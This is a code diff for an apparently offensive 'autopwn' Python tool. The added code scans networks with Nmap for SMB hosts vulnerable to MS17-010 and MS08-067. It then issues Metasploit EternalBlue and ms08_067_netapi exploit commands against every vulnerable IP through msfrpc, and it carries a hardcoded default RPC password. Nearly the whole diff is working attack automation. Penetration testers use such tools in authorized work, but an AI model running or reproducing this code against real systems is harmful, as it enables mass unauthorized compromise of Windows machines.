@@ -8,17 +8,20 @@ import argparse
 import netifaces
 from IPython import embed
 from termcolor import colored
-from multiprocessing import Process
+from threading import Thread, Lock
 from libnmap.process import NmapProcess
 from netaddr import IPNetwork, AddrFormatError
 from subprocess import Popen, PIPE, CalledProcessError
 from libnmap.parser import NmapParser, NmapParserException
+
+CLIENT = msfrpc.Msfrpc({})
 
 def parse_args():
     # Create the arguments
     parser = argparse.ArgumentParser()
     parser.add_argument("-l", "--hostlist", help="Host list file")
     parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
+    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
     parser.add_argument("-x", "--xml", help="Nmap XML file")
     parser.add_argument("--port", default=55552, type=int, help="Port for msfrpc")
     return parser.parse_args()
@@ -36,14 +39,18 @@ def print_good(msg):
 def print_great(msg):
     print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))
 
-def keep_alive(client):
+def keep_alive(args):
     '''
     msfrpc will kill auth tokens after 5m
     '''
+    global CLIENT
+    lock = Lock()
+
     last_check = time.time()
     while True:
         if time.time() - last_check > 100:
-            client.call('console.list')
+            with lock:
+                CLIENT.login(args.username, args.password)
         time.sleep(1)
 
 def run_proc(cmd):
@@ -99,7 +106,7 @@ def nmap_scan(hosts):
     Do Nmap scan
     '''
     #nmap_args = '-sS -T4 -sV -n --max-retries 5 -oA autopwn-scan'
-    nmap_args = '-sS -T4 -sV -n --max-retries 5 --top-ports 10 -oA autopwn-scan'
+    nmap_args = '-sS -T4 -sV -n --max-retries 5 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA autopwn-scan'
     nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
     rc = nmap_proc.sudo_run_background()
     nmap_status_printer(nmap_proc)
@@ -122,7 +129,7 @@ def nmap_status_printer(nmap_proc):
 
         time.sleep(1)
 
-def get_hosts(args, report):
+def get_hosts(report):
     '''
     Gets list of hosts with port 445 or 3268 (to find the DC) open
     and a list of hosts with smb signing disabled
@@ -133,13 +140,12 @@ def get_hosts(args, report):
     for host in report.hosts:
         if host.is_up():
             ip = host.address
-            hosts.append(host)
             print_info('Host up: {}'.format(ip))
             for s in host.services:
                 if s.open():
                     banner = s.banner.split('product: ')[1]
                     port = str(s.port)
-                    print_info(' {}: {}'.format(port, banner))
+                    print '          {} - {}'.format(port, banner)
                     port_banner = [(port, banner)]
                     if hosts.get(ip):
                         hosts[ip] += port_banner
@@ -152,19 +158,123 @@ def get_hosts(args, report):
 
     return hosts
 
+def get_smb_vuln_hosts(report):
+    '''
+    Parse NSE scripts to find vulnerable hosts
+    '''
+    vuln_hosts = {}
+    nse_scripts = ['smb-vuln-ms17-010', 'smb-vuln-ms08-067']
+
+    for host in report.hosts:
+        ip = host.address
+
+        for script_out in host.scripts_results:
+            for script in nse_scripts:
+                if script_out['id'] == script:
+                    if 'State: VULNERABLE' in script_out['output']:
+                        print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
+                        if vuln_hosts.get(ip):
+                            vuln_hosts[ip].append(script)
+                        else:
+                            vuln_hosts[ip] = [script]
+
+    return vuln_hosts
+
+def get_smb_cmds(smb_vuln_hosts):
+    all_ms17_cmds = []
+    all_ms08_cmds = []
+
+    port = '445'
+
+    ms17_path = 'exploit/windows/smb/ms17_010_eternalblue'
+    ms17_rhost_var = 'RHOST'
+    ms17_opts = 'set MaxExploitAttempts 6\n'
+
+
+    ms08_path = 'exploit/windows/smb/ms08_067_netapi'
+    ms08_rhost_var = 'RHOST'
+
+    for ip in smb_vuln_hosts:
+        for script in smb_vuln_hosts[ip]:
+            if script == 'smb-vuln-ms17-010':
+                ms17_cmd = create_msf_cmd(ms17_path, ms17_rhost_var, ip, port, ms17_opts)
+                all_ms17_cmds.append(ms17_cmd)
+            elif script == 'smb-vuln-ms08-067':
+                ms08_cmd = create_msf_cmd(ms08_path, ms08_rhost_var, ip, port, '')
+                all_ms08_cmds.append(ms08_cmd)
+
+    return all_ms17_cmds, all_ms08_cmds
+
+def create_msf_cmd(exploit_path, rhost_var, ip, port, extra_opts):
+    '''
+    1. exploit path
+    2. RHOST/RHOSTS
+    3. IP
+    4. port
+    5. extra options
+    '''
+    cmds = """
+           use {}\n
+           set {} {}\n
+           set PORT {}\n
+           {}
+           set ExitOnSession True
+           exploit -z\n
+           """.format(exploit_path, rhost_var, ip, port, extra_opts)
+
+    return cmds
+
+def exploit_smb(c_id, smb_vuln_hosts):
+    '''
+    Exploits ms08-067 and ms17-010
+    '''
+    ms17_cmds, ms08_cmds = get_smb_cmds(smb_vuln_hosts)
+    if len(ms17_cmds) > 0:
+        for cmd in ms17_cmds:
+
+            # Make sure the console is not busy
+            while CLIENT.call('console.read', [c_id])['busy'] == True:
+                time.sleep(1)
+
+            CLIENT.call('console.write',[c_id, cmd])
+
+    if len(ms08_cmds) > 0:
+        for cmd in ms08_cmds:
+
+            # Make sure the console is not busy
+            while CLIENT.call('console.read', [c_id])['busy'] == True:
+                time.sleep(1)
+
+            CLIENT.call('console.write',[c_id, cmd])
+
 def main(report, args):
+    global CLIENT
+
+    # hosts will only be populated with ips that have open ports
     # hosts = {ip : [(port, banner), (port2, banner2)]
-    hosts = get_hosts(args, report)
-    client = msfrpc.Msfrpc({})
+    hosts = get_hosts(report)
+
+    # these are in format {ip:[ms08-nse, ms17-nse]}
+    smb_vuln_hosts = get_smb_vuln_hosts(report)
+
 
     # initialize keep alive process
-    p = Process(target=keep_alive, args=(client,))
+    p = Thread(target=keep_alive, args=(args,))
     p.start()
 
-    client.login('msf', args.password)
-    client.call('console.create')
-    c_ids = [x['id'] for x in client.call('console.list')['consoles']]
-    c_id = c_ids[0]
+    CLIENT.login(args.username, args.password)
+    c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
+
+    if len(c_ids) == 0:
+        CLIENT.call('console.create')
+        c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
+
+    # Get the latest console
+    c_id = c_ids[-1]
+
+    #Exploit ms08/17
+    exploit_smb(c_id, smb_vuln_hosts)
+
     embed()
 
 if __name__ == "__main__":
